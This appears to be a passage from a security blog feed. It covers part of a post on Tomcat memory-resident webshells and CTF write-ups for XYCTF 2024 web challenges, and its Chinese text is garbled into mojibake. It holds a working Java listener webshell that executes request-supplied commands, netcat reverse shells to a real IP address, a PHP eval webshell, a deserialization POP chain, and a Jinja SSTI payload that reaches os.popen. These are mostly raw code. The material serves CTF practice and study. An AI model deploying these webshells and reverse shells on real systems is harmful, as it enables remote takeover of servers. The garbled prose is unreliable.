title="Filter"></a>Filter</h4><blockquote><p>Filterç”¨äºæ‹¦æˆªç”¨æˆ·è¯·æ±‚ä»¥åŠæœåŠ¡ç«¯çš„å“åº”ï¼Œèƒ½å¤Ÿåœ¨æ‹¦æˆªä¹‹åå¯¹è¯·æ±‚å’Œå“åº”åšå‡ºç›¸åº”çš„ä¿®æ”¹ã€‚Filterä¸æ˜¯Servletï¼Œä¸èƒ½ç›´æ¥è®¿é—®ï¼Œå®ƒèƒ½å¤Ÿå¯¹äºWebåº”ç”¨ä¸­çš„èµ„æºï¼ˆServletã€JSPã€é™æ€é¡µé¢ç­‰ï¼‰åšå‡ºæ‹¦æˆªï¼Œä»è€Œå®ç°ä¸€äº›ç›¸åº”çš„åŠŸèƒ½ã€‚ä¸‹é¢æ˜¯Filteråœ¨Serverä¸­çš„è°ƒç”¨æµç¨‹å›¾</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><blockquote><p>Listeneræ˜¯ä¸€ä¸ªå®ç°äº†ç‰¹å®šæ¥å£çš„Javaç¨‹åºï¼Œç”¨äºç›‘å¬ä¸€ä¸ªæ–¹æ³•æˆ–è€…å±æ€§ï¼Œå½“è¢«ç›‘å¬çš„æ–¹æ³•è¢«è°ƒç”¨æˆ–è€…å±æ€§æ”¹å˜æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨æ‰§è¡ŒæŸä¸ªæ–¹æ³•ã€‚</p></blockquote><p>ä¸‰å¤§ç»„ä»¶åŠ è½½é¡ºåº</p><ol><li><strong>Listener</strong></li><li><strong>Filter</strong></li><li><strong>Servlet</strong></li></ol><h3 id="Tomcatä¸­çš„ä¸‰ç§Context"><a href="#Tomcatä¸­çš„ä¸‰ç§Context" class="headerlink" title="Tomcatä¸­çš„ä¸‰ç§Context"></a>Tomcatä¸­çš„ä¸‰ç§Context</h3><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1-795x1500.jpg"></p><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><blockquote><p>åœ¨Tomcatä¸­çš„servletéƒ½åŸºæœ¬ä¸Šéœ€è¦å®ç°è¿™ä¸ªæ¥å£ï¼Œè§„å®šäº†å¦‚æœè¦å®ç°ä¸€ä¸ªWEBå®¹å™¨ï¼Œä»–çš„å†…å®¹å°±å¿…é¡»è¦åŒ…å«Servletcontexté‡Œçš„å†…å®¹</p></blockquote><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><blockquote><p>åœ¨Tomcatä¸­ï¼ŒServletContextçš„å®ç°å°±æ˜¯ApplicationContext<br><strong>å…¶ä¸­ApplicationContextå®ç°äº†ServletContextè§„èŒƒå®šä¹‰çš„ä¸€äº›æ–¹æ³•ï¼Œä¾‹å¦‚addServlet,addFilterç­‰</strong></p></blockquote><h4 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h4><blockquote><p>StandardContextæ˜¯Tomcatä¸­çœŸæ­£èµ·ä½œç”¨çš„Contextï¼Œè´Ÿè´£è·ŸTomcatçš„åº•å±‚äº¤äº’ï¼ŒApplicationContextå…¶å®æ›´åƒå¯¹StandardContextçš„ä¸€ç§å°è£…ã€‚</p></blockquote><h2 id="Listenerå‹å†…å­˜é©¬"><a href="#Listenerå‹å†…å­˜é©¬" class="headerlink" title="Listenerå‹å†…å­˜é©¬"></a>Listenerå‹å†…å­˜é©¬</h2><p>æˆ‘ä»¬çŸ¥é“æœ€å…ˆæ¥æ”¶åˆ°è¯·æ±‚çš„å°±æ˜¯listenerç»„ä»¶, å› æ­¤æˆ‘ä»¬å®Œå…¨å¯ä»¥åœ¨æœåŠ¡å™¨ä¸­åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ¶æ„çš„listener</p><p>è€ŒListeneræ ¹æ®äº‹ä»¶æºçš„ä¸åŒï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹ä¸‰ç§</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>å¯¹äºServletRequestListener, æˆ‘ä»¬è®¿é—®ä»»æ„æœåŠ¡å™¨èµ„æºæ˜¯éƒ½ä¼šè§¦å‘, å› æ­¤ç”¨æ¥ä½œå†…å­˜é©¬å†é€‚åˆä¸è¿‡äº†</p><p>å½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘<code>ServletRequestListener#requestInitialized()</code>æ–¹æ³•ã€‚ä¸‹é¢æˆ‘ä»¬æ¥å®ç°ä¸€ä¸ªæ¶æ„çš„Listener</p><p>æˆ‘ä»¬ç›´æ¥åœ¨è¿™é‡Œåˆ›å»ºä¸€ä¸ªlistener</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240522000146182.png" alt="image-20240522000146182"></p><p>ideaä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬ç”ŸæˆåŸºæœ¬çš„æ¡†æ¶, éœ€è¦é‡å†™çš„æ–¹æ³•ç­‰</p><p>æˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸ºæ¶æ„çš„listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;shell_cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶è®¿é—®ä»»æ„çš„è·¯ç”±å³å¯è§¦å‘ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240522001621396.png" alt="image-20240522001621396"></p><p>ä¸‹é¢çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å°†æ¶æ„çš„ListeneråŠ¨æ€æ³¨å†Œè¿›æœåŠ¡å™¨äº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹Listenerçš„åˆ›å»ºè¿‡ç¨‹ã€‚</p><h3 id="Listenerçš„åˆ›å»ºè¿‡ç¨‹"><a href="#Listenerçš„åˆ›å»ºè¿‡ç¨‹" class="headerlink" title="Listenerçš„åˆ›å»ºè¿‡ç¨‹"></a>Listenerçš„åˆ›å»ºè¿‡ç¨‹</h3><p>é¦–å…ˆè´´å‡ºlistenerçš„è°ƒç”¨æ ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">requestInitialized:<span class="number">13</span>, Shell_Listener (Listener)</span><br><span class="line">fireRequestInitEvent:<span class="number">5992</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">121</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">357</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">382</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcatå†…å­˜é©¬åˆ†æ&quot;&gt;&lt;a href=&quot;#Tomcatå†…å­˜é©¬åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;Tomcatå†…å­˜é©¬åˆ†æ&quot;&gt;&lt;/a&gt;Tomcatå†…å­˜é©¬åˆ†æ&lt;/h1&gt;&lt;h2 id=&quot;å‚è€ƒé“¾æ¥&quot;&gt;&lt;a href=&quot;#å‚è€ƒé“¾æ¥&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF 2024 Web</title>
    <link href="http://example.com/2024/04/28/XYCTF-2024-Web/"/>
    <id>http://example.com/2024/04/28/XYCTF-2024-Web/</id>
    <published>2024-04-28T06:51:55.000Z</published>
    <updated>2024-04-28T06:53:23.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XYCTF-2024-Web"><a href="#XYCTF-2024-Web" class="headerlink" title="XYCTF 2024 Web"></a>XYCTF 2024 Web</h1><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>ç•¥</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>ç•¥</p><h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><p>ç›¸åŒmd5å›¾ç‰‡, ä¸€æœå°±æœ‰, ç•¥</p><h2 id="ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§"><a href="#ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§" class="headerlink" title="ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§"></a>ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è‚˜æ­»ä½ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¦æ·»åŠ ä¸€ä¸ª<code>%0a</code>è®©ä»£ç ä¸è¢«#æ³¨é‡Š, ç„¶åç”¨<code>%23</code>å†æŠŠ,manba outæ³¨é‡Šæ‰</p><p>$(which sh)ä»£æ›¿bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23</span><br><span class="line">&amp;1=nc 107.148.75.202 1234 -e $(which sh)</span><br></pre></td></tr></table></figure><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a><strong>ezMake</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php if(eval($$_POST[1])) ?&gt;&#x27; &gt; a.php</span><br></pre></td></tr></table></figure><h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a><strong>ez?Make</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 107.148.75.202 1234  -e `which sh`</span><br></pre></td></tr></table></figure><h2 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;win&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = [<span class="number">1</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;c-&gt;s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><p>é…åˆfast-destruct</p><h2 id="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº"><a href="#æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº" class="headerlink" title="æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº"></a>æˆ‘æ˜¯ä¸€ä¸ªå¤è¯»æœº</h2><p>adminå¯†ç : asdqwe</p><p>æ‰¾catch_warnings</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xyctf.top:36318/index&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZgzePQ.xovem1N0fv78Nth8E0_iXRxY7UA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sentence = <span class="string">&#x27;?sentence=ä½ å¥½()|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()|attr(request.args.d)(&#123;&#125;)&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = url + sentence</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line">    res = requests.get(url=payload.<span class="built_in">format</span>(<span class="built_in">str</span>(i)), headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;catch_warnings&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;found catch_warnings is in &#x27;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;å‡ºç°äº†ä¸€ç‚¹å°é—®é¢˜&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#found catch_warnings is in 221</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sentence=ä½ å¥½()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(221)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)</span><br><span class="line">&amp;x1=__class__</span><br><span class="line">&amp;x2=__base__</span><br><span class="line">&amp;x3=__subclasses__</span><br><span class="line">&amp;x4=__getitem__</span><br><span class="line">&amp;x5=__init__</span><br><span class="line">&amp;x6=__globals__</span><br><span class="line">&amp;x7=__builtins__</span><br><span class="line">&amp;x8=eval</span><br><span class="line">&amp;x9=__import__(&quot;os&quot;).popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span 